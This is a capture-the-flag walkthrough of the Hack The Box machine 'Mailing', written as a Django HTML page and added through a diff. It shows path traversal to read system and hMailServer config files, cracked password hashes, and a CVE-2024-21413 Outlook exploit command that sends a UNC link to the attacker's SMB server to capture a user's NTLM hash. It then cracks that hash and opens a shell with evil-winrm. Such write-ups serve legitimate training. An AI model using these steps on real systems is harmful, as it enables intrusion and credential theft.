@@ -1,0 +1,180 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Mailing</h1>
+    <p class="text">Difficulty : Easy | UserDifficulty : 4.3</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Did not follow redirect to http://mailing.htb
+|_http-server-header: Microsoft-IIS/10.0
+110/tcp   open  pop3          hMailServer pop3d
+|_pop3-capabilities: UIDL TOP USER
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp   open  imap          hMailServer imapd
+|_imap-capabilities: completed QUOTA CAPABILITY SORT OK ACL RIGHTS=texkA0001 IMAP4rev1 CHILDREN NAMESPACE IDLE IMAP4
+445/tcp   open  microsoft-ds?
+465/tcp   open  ssl/smtp      hMailServer smtpd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+587/tcp   open  smtp          hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+993/tcp   open  ssl/imap      hMailServer imapd
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: completed QUOTA CAPABILITY SORT OK ACL RIGHTS=texkA0001 IMAP4rev1 CHILDREN NAMESPACE IDLE IMAP4
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+5040/tcp  open  unknown
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+7680/tcp  open  pando-pub?
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49903/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+<p class="text">HTTP and several mailing services are open. First I'll browse http server.</p>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/mailing/1.png' %}" alt="">
+    <p class="text">The main page holds interesting download button, which is connected to download.php?file=instructions.pdf. We may be able to download other files from this url. Let's try this.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/mailing/2.png' %}" alt="">
+    <p class="text">I tested with <u>download.php?file=../../../../../Windows/System32/drivers/etc/hosts</u> and it successfully donwloaded the file.</p>
+</div>
+
+<h2 class="subtitle">Foothold</h2>
+
+<p class="text">Because we can install arbitrary file with this method, we can install config file if we could find it. But the application we know it's running on the target machine is only hMailservice. Therefore, I'll research its configuration file in google.</p>
+
+<p class="text">Searching <u>hmailserver configuration file location</u> revealed that the service config file is locate to <u>C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini</u> or <u>C:\Program Files\hMailServer\Bin\hMailServer.ini</u> in default. Let's try the path.</p>
+
+
+
+<div class="img">
+    <img src="{% static 'Ethhack/images/mailing/3.png' %}" alt="">
+    <p class="text">The path <u>download.php?file=../../../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini</u> let me getting config file.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ cat hMailServer.ini
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=<u>841bb5acfa6779ae432fd7a4e6600ba7</u>
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1</code></pre></div>
+
+
+<p class="text">There is admin password. I could decoded it with crackstation, and it returned <u>homenetworkingadministrator</u>.</p>
+
+<p class="text">Also, the target server hosts mail server, which means also need to use mail client. So, I decided to search client side vulnerability. </p>
+
+<p class="text">Simple keyword <u>window mail vulnerability</u> returned <a href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability">this poc</a>.</p>
+
+<p class="text">This poc also says it can leak NLTM hash via SMPT. To test it, we can use <u>impacket-smbserver</u> and include test.txt into url.</p>
+
+
+<div class="code-box"><pre><code>└─$ echo 'test' > test.txt
+└─$ impacket-smbserver share . -smb2support</code></pre></div>
+
+<p class="text">Then, runt the poc. I tested all possible combination for username and sender email, and below code worked.</p>
+<div class="code-box"><pre><code>python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.40\share\test.txt" --subject test</code></pre></div>
+
+
+<p class="text">Then, response backed.</p>
+<div class="code-box"><pre><code>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.232.39,49869)
+[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
+[*] User MAILING\maya authenticated successfully
+[*] maya::MAILING:aaaaaaaaaaaaaaaa:a056f2a5b5e956f75f68e27e7edde6f2:010100000000000000edd7671440dc0177f47a2b1f0cb2e50000000001001000670064004d0063006e006e006700530003001000670064004d0063006e006e0067005300020010004b006f00410048006c004c006d005a00040010004b006f00410048006c004c006d005a000700080000edd7671440dc0106000400020000000800300030000000000000000000000000200000e893b7cd379a8b19f8b49d726e2c58de3a7dbcbca0bf6843079adaf280aa010c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340030000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:smbFolder)
+[*] NetrGetShareInfo Level: 1</code></pre></div>
+
+<p class="text">We can copy and paste maya::MAILING:aaaa.... to our file.</p>
+
+<div class="code-box"><pre><code>└─$ echo 'paste here' > hash
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+m4y4ngs4ri       (maya)     
+1g 0:00:00:02 DONE (2025-10-18 05:49) 0.4291g/s 2546Kp/s 2546Kc/s 2546KC/s m5681687..m3skl3s
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. </code></pre></div>
+
+<p class="text">We got plain password <u>m4y4ngs4ri</u></p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maya\Documents> </code></pre></div>
+
+<p class="text">We got maya account. You can find user flag on C:\Users\maya\Desktop.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Due to its PrivEsc method wasn't useful for OSCP preparation, I skip PrivEsc section. I'll write it down later...(maybe)</p>
+
+</body>
+</html>
